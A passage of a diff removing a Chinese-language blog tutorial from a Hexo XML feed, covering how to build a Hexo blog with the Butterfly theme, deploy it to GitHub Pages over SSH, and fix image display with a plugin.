-<li>安装Git<br> 在自己电脑上安装好Git，hexo部署到GitHub时要用。<br> 网上找篇教程</li>
-<li>安装NodeJS<br>在自己电脑上安装好NodeJS，Hexo是基于NodeJS编写的，所以需要安装NodeJS和npm工具。<br>网上找篇教程</li>
-</ol>
-<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>我们采用Hexo来创建我们的博客网站，Hexo 是一个基于NodeJS的静态博客网站生成器，使用Hexo不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 官网。</p>
-<p>安装 Hexo</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
-
-<p>查看版本</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure>
-
-<p>创建一个项目 hexo-blog 并初始化</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init hexo-blog</span><br><span class="line"><span class="built_in">cd</span> hexo-blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
-
-<p>本地启动</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
-
-
-<p>浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p>
-<img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313232222727.png" class="" title="image-20230313232222727">
-
-
-
-
-
-<h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页。</p>
-<p>点击<code>Your repositories</code>，进入仓库页面。</p>
-<p>点击<code>New</code>按钮，进入仓库创建页面。</p>
-<p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code>。</p>
-<p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页。</p>
-<h1 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h1><p>4.1生成SSH添加到GitHub</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。</p>
-<p>可以用以下两条，检查一下你有没有输对</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后创建SSH,一路回车</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>在gitbash中，查看是否成功</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如果失败更改端口</p>
-<p>操作方法：</p>
-<p>进入~&#x2F;.ssh下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>
-
-
-<p>创建一个config文件(这里我用的vim编辑器)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure>
-
-
-<p>编辑文件内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>保存退出<br>检查是否成功</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-
-<h1 id="将hexo部署到GitHub"><a href="#将hexo部署到GitHub" class="headerlink" title="将hexo部署到GitHub"></a>将hexo部署到GitHub</h1><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>然后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<p>若启动连接失败，输入以下命令</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="模板导入"><a href="#模板导入" class="headerlink" title="模板导入"></a>模板导入</h1><p>在hexo项目根目录下执行操作clone主题</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>
-
-<p>如果沒有 pug 以及 <a href="https://so.csdn.net/so/search?q=stylus&spm=1001.2101.3001.7020">stylus</a> 的渲染器，还需要下载，否则在项目运行时会报错：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
-
-<p>3、修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#theme: landscape</span></span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure>
-
-
-
-<p>若出现乱码</p>
-<p>原因是<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>在5.0之后把swig给删除了需要自己手动安装</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="解决：hexo-github本地和线上图片不显示问题"><a href="#解决：hexo-github本地和线上图片不显示问题" class="headerlink" title="解决：hexo+github本地和线上图片不显示问题"></a>解决：hexo+github本地和线上图片不显示问题</h2><p>在搭载好hexo(butterfly)+github博客后（有道云笔记记录），新建博客无法图片问题，多方寻找网上的解决办法仍未解决，大多安装了hexo-asset-image插件来解决，但是本人多项测试后，均为无效，唯一有效的需要将图片格式转换为这样，但是以一个一个去转换非常麻烦，因此继续寻求解决办法，最终找到如下帖子：<a href="https://moeci.com/posts/hexo-typora/%EF%BC%8C%E8%BF%99%E4%BD%8D%E5%A4%A7%E4%BD%AC%E5%BC%80%E5%8F%91%E7%9A%84%E6%8F%92%E4%BB%B6%E6%98%AFhexo-asset-img%EF%BC%8C%E8%80%8C%E9%9D%9Ehexo-asset-image%EF%BC%8C%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%9C%89%E6%95%88">https://moeci.com/posts/hexo-typora/，这位大佬开发的插件是hexo-asset-img，而非hexo-asset-image，经过测试，有效</a></p>
-<p>1配置 <a href="https://so.csdn.net/so/search?q=Typora&spm=1001.2101.3001.7020">Typora</a> 偏好设置，如下图更改，此操作将图片文件保存路径: .&#x2F;${filename} 即保存到与 当前正在编辑的文件名相同的同级文件夹下。</p>
-<img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313233951219.png" class="" title="image-20230313233951219">
-
-
-
-<p>修改_config.yml中的post_asset_folder，false 改为 true，这样修改后，每次 ‘hexo new page’ 生成新文章，都会在文章文件同级目录创建一个与文章文件名同名的文件夹，我们就在这里存放此文章的图片。</p>
-<p>安装插件hexo-asset-img：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
-
-<p>完成安装</p>
-<h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;about&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new “name”       <span class="comment"># 新建文章</span></span><br><span class="line"></span><br><span class="line">hexo new page “name”  <span class="comment"># 新建页面</span></span><br><span class="line"></span><br><span class="line">hexo g                <span class="comment"># 生成页面</span></span><br><span class="line"></span><br><span class="line">hexo d                <span class="comment"># 部署</span></span><br><span class="line"></span><br><span class="line">hexo g -d             <span class="comment"># 生成页面并部署</span></span><br><span class="line"></span><br><span class="line">hexo s                <span class="comment"># 本地预览</span></span><br><span class="line"></span><br><span class="line">hexo clean            <span class="comment"># 清除缓存和已生成的静态文件</span></span><br><span class="line"></span><br><span class="line">hexo <span class="built_in">help</span>             <span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>Others</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
       </tags>
   </entry>
   <entry>
